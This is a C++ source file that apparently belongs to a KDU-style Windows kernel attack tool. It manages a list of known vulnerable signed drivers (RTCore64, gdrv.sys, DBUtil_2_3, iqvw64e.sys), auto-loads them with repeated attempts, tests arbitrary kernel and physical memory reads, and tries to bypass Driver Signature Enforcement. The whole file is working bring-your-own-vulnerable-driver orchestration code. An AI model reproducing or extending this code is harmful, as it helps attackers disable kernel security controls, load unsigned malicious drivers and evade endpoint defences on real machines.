/**
 * @file ProviderManager.cpp
 * @author Gregory King
 * @date September 7, 2025
 * @brief KDU-style provider management system implementation.
 */

#include "ProviderManager.h"
#include <iostream>
#include <functional>

namespace KernelMode {
    namespace Providers {

        ProviderManager::ProviderManager() {
            InitializeProviderDatabase();
        }

        ProviderManager::~ProviderManager() {
            // Cleanup is handled by unique_ptr destructors
        }

        void ProviderManager::InitializeProviderDatabase() {
            std::wcout << L"[+] Initializing KDU-style provider database..." << std::endl;

            // RTCore64 Provider
            providerDatabase.push_back({
                PROVIDER_RTCORE64,
                L"RTCore64",
                L"MSI Afterburner RTCore64.sys - Physical memory access driver",
                CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_DSE_BYPASS | CAPABILITY_PHYSICAL_BRUTEFORCE | CAPABILITY_PREFER_PHYSICAL,
                false, // Doesn't require DSE bypass to load
                []() { return std::make_unique<RTCoreProvider>(); }
            });

            // Gdrv Provider  
            providerDatabase.push_back({
                PROVIDER_GDRV,
                L"Gdrv",
                L"GIGABYTE gdrv.sys - Physical memory access driver (CVE-2018-19320)",
                CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_VIRTUAL_MEMORY | CAPABILITY_DSE_BYPASS,
                false,
                []() { return std::make_unique<GdrvProvider>(); }
            });

            // DBUtil Provider
            providerDatabase.push_back({
                PROVIDER_DBUTIL,
                L"DBUtil",
                L"Dell DBUtil_2_3.sys - Memory mapping driver",
                CAPABILITY_VIRTUAL_MEMORY | CAPABILITY_PHYSICAL_MEMORY,
                true, // Requires DSE bypass
                []() { return std::make_unique<DBUtilProvider>(); }
            });

            // Intel Nal Provider (KDU Default)
            providerDatabase.push_back({
                PROVIDER_INTEL_NAL,
                L"IntelNal",
                L"Intel Network Adapter Diagnostic Driver (iqvw64e.sys) - Physical memory access",
                CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_PREFER_PHYSICAL | CAPABILITY_DSE_BYPASS,
                false,
                []() { return std::make_unique<IntelNalProvider>(); }
            });

            std::wcout << L"[+] Provider database initialized with " << providerDatabase.size() << L" providers." << std::endl;
        }

        std::unique_ptr<IProvider> ProviderManager::AutoLoadProvider(bool bypassDSE) {
            std::wcout << L"[+] Starting KDU-style auto-loading process..." << std::endl;
            std::wcout << L"[*] Testing " << providerDatabase.size() << L" providers..." << std::endl;

            // Attempt global DSE bypass first if requested
            if (bypassDSE) {
                std::wcout << L"[*] Attempting global DSE bypass..." << std::endl;
                // AttemptGlobalDSEBypass(); // Undefined in header currently. Moved logic to BYOVDManager.
            }

            // Try each provider in order of preference
            for (size_t i = 0; i < providerDatabase.size(); ++i) {
                const auto& providerInfo = providerDatabase[i];
                
                std::wcout << L"[*] Attempting to load provider " << (i + 1) << L"/" << providerDatabase.size() 
                          << L": " << providerInfo.Name << std::endl;
                std::wcout << L"[*] Description: " << providerInfo.Description << std::endl;

                try {
                    // Create provider instance
                    auto provider = providerInfo.CreateProvider();
                    if (!provider) {
                        std::wcerr << L"[-] Failed to create provider instance." << std::endl;
                        continue;
                    }

                    // Initialize the provider
                    bool initSuccess = provider->Initialize(0, bypassDSE && providerInfo.RequiresDSE);
                    if (!initSuccess) {
                        std::wcerr << L"[-] Provider initialization failed." << std::endl;
                        continue;
                    }

                    std::wcout << L"[+] Provider initialized successfully!" << std::endl;

                    // Test the provider
                    if (TestProvider(provider.get())) {
                        std::wcout << L"[+] Provider tests passed! Using " << providerInfo.Name << std::endl;
                        return provider;
                    } else {
                        std::wcerr << L"[-] Provider tests failed." << std::endl;
                        provider->Deinitialize();
                    }

                } catch (const std::exception& e) {
                    std::wcerr << L"[-] Exception while testing provider: " << e.what() << std::endl;
                } catch (...) {
                    std::wcerr << L"[-] Unknown exception while testing provider." << std::endl;
                }

                std::wcout << L"[*] Moving to next provider..." << std::endl;
            }

            std::wcerr << L"[-] All providers failed to load. Auto-loading unsuccessful." << std::endl;
            return nullptr;
        }

        std::unique_ptr<IProvider> ProviderManager::LoadProvider(ProviderType providerType, bool bypassDSE) {
            std::wcout << L"[+] Loading specific provider type: " << static_cast<int>(providerType) << std::endl;

            if (providerType == PROVIDER_AUTO) {
                return AutoLoadProvider(bypassDSE);
            }

            // Find the provider in database
            for (const auto& providerInfo : providerDatabase) {
                if (providerInfo.Type == providerType) {
                    std::wcout << L"[*] Loading " << providerInfo.Name << std::endl;

                    try {
                        auto provider = providerInfo.CreateProvider();
                        if (!provider) {
                            std::wcerr << L"[-] Failed to create provider instance." << std::endl;
                            return nullptr;
                        }

                        bool initSuccess = provider->Initialize(0, bypassDSE && providerInfo.RequiresDSE);
                        if (!initSuccess) {
                            std::wcerr << L"[-] Provider initialization failed." << std::endl;
                            return nullptr;
                        }

                        if (TestProvider(provider.get())) {
                            std::wcout << L"[+] Provider loaded successfully!" << std::endl;
                            return provider;
                        } else {
                            std::wcerr << L"[-] Provider tests failed." << std::endl;
                            provider->Deinitialize();
                        }

                    } catch (const std::exception& e) {
                        std::wcerr << L"[-] Exception while loading provider: " << e.what() << std::endl;
                    }

                    return nullptr;
                }
            }

            std::wcerr << L"[-] Provider type not found in database." << std::endl;
            return nullptr;
        }

        const std::vector<ProviderInfo>& ProviderManager::GetAvailableProviders() const {
            return providerDatabase;
        }

        bool ProviderManager::TestProvider(IProvider* provider) {
            std::wcout << L"[*] Running provider tests..." << std::endl;

            if (!provider) {
                return false;
            }

            // Run basic tests first
            if (!RunBasicTests(provider)) {
                std::wcerr << L"[-] Basic tests failed." << std::endl;
                return false;
            }

            // Run advanced tests
            if (!RunAdvancedTests(provider)) {
                std::wcerr << L"[-] Advanced tests failed." << std::endl;
                return false;
            }

            std::wcout << L"[+] All provider tests passed!" << std::endl;
            return true;
        }

        std::unique_ptr<IProvider> ProviderManager::AdvancedAutoLoad() {
            std::wcout << L"[+] Starting advanced auto-loading with comprehensive testing..." << std::endl;

            // First attempt without DSE bypass
            std::wcout << L"[*] Phase 1: Attempting load without DSE bypass..." << std::endl;
            auto provider = AutoLoadProvider(false);
            if (provider) {
                return provider;
            }

            // Second attempt with DSE bypass
            std::wcout << L"[*] Phase 2: Attempting load with DSE bypass..." << std::endl;
            provider = AutoLoadProvider(true);
            if (provider) {
                return provider;
            }

            // If all else fails, try each provider individually with maximum effort
            std::wcout << L"[*] Phase 3: Individual provider testing with maximum effort..." << std::endl;
            
            for (const auto& providerInfo : providerDatabase) {
                std::wcout << L"[*] Maximum effort attempt for " << providerInfo.Name << std::endl;
                
                // Try multiple initialization attempts
                for (int attempt = 0; attempt < 3; ++attempt) {
                    std::wcout << L"[*] Attempt " << (attempt + 1) << L"/3..." << std::endl;
                    
                    try {
                        auto testProvider = providerInfo.CreateProvider();
                        if (testProvider && testProvider->Initialize(0, true)) {
                            if (RunBasicTests(testProvider.get())) {
                                std::wcout << L"[+] Success on attempt " << (attempt + 1) << L"!" << std::endl;
                                return testProvider;
                            }
                            testProvider->Deinitialize();
                        }
                    } catch (...) {
                        // Continue to next attempt
                    }
                    
                    Sleep(1000); // Wait between attempts
                }
            }

            std::wcerr << L"[-] Advanced auto-loading failed completely." << std::endl;
            return nullptr;
        }

        size_t ProviderManager::GetProviderCount() const {
            return providerDatabase.size();
        }

        bool ProviderManager::AttemptGlobalDSEBypass() {
            std::wcout << L"[*] Attempting global DSE bypass..." << std::endl;
            
            // Try to use any available provider for DSE bypass
            for (const auto& providerInfo : providerDatabase) {
                if (providerInfo.Capabilities & CAPABILITY_DSE_BYPASS) {
                    std::wcout << L"[*] Trying DSE bypass with " << providerInfo.Name << std::endl;
                    
                    try {
                        auto provider = providerInfo.CreateProvider();
                        if (provider && provider->Initialize(0, false)) {
                            if (provider->BypassDSE()) {
                                std::wcout << L"[+] Global DSE bypass successful!" << std::endl;
                                provider->Deinitialize();
                                return true;
                            }
                            provider->Deinitialize();
                        }
                    } catch (...) {
                        // Continue to next provider
                    }
                }
            }

            std::wcout << L"[-] Global DSE bypass failed." << std::endl;
            return false;
        }

        bool ProviderManager::RunBasicTests(IProvider* provider) {
            std::wcout << L"[*] Running basic provider tests..." << std::endl;

            // Test 1: Check capabilities
            ULONG capabilities = provider->GetCapabilities();
            std::wcout << L"[*] Provider capabilities: 0x" << std::hex << capabilities << std::endl;

            // Test 2: Try to read a known kernel address (if we have virtual memory capability)
            if (capabilities & CAPABILITY_VIRTUAL_MEMORY) {
                std::wcout << L"[*] Testing virtual memory read..." << std::endl;
                
                // Try to read from a commonly accessible kernel address
                uintptr_t testAddress = 0xFFFFF78000000000; // KUSER_SHARED_DATA
                uint32_t testValue = 0;
                
                if (provider->ReadKernelMemory(testAddress, &testValue, sizeof(testValue))) {
                    std::wcout << L"[+] Virtual memory read test passed." << std::endl;
                } else {
                    std::wcerr << L"[-] Virtual memory read test failed." << std::endl;
                    return false;
                }
            }

            // Test 3: Physical memory test (if supported)
            if (capabilities & CAPABILITY_PHYSICAL_MEMORY) {
                std::wcout << L"[*] Testing physical memory access..." << std::endl;
                
                // Try to read from low physical memory
                uintptr_t physAddr = 0x1000; // Usually safe to read
                uint32_t physValue = 0;
                
                if (provider->ReadPhysicalMemory(physAddr, &physValue, sizeof(physValue))) {
                    std::wcout << L"[+] Physical memory read test passed." << std::endl;
                } else {
                    std::wcout << L"[*] Physical memory read test failed (may be normal)." << std::endl;
                }
            }

            return true;
        }

        bool ProviderManager::RunAdvancedTests(IProvider* provider) {
            std::wcout << L"[*] Running advanced provider tests..." << std::endl;

            ULONG capabilities = provider->GetCapabilities();

            // Test virtual-to-physical translation if available
            if (capabilities & (CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_VIRTUAL_MEMORY)) {
                std::wcout << L"[*] Testing virtual-to-physical translation..." << std::endl;
                
                uintptr_t testVirtual = 0xFFFFF78000000000; // KUSER_SHARED_DATA
                uintptr_t physical = provider->VirtualToPhysical(testVirtual);
                
                if (physical != 0) {
                    std::wcout << L"[+] Virtual-to-physical translation successful: 0x" 
                              << std::hex << testVirtual << L" -> 0x" << physical << std::endl;
                } else {
                    std::wcout << L"[*] Virtual-to-physical translation failed (may be normal)." << std::endl;
                }
            }

            return true;
        }

    } // namespace Providers
} // namespace KernelMode
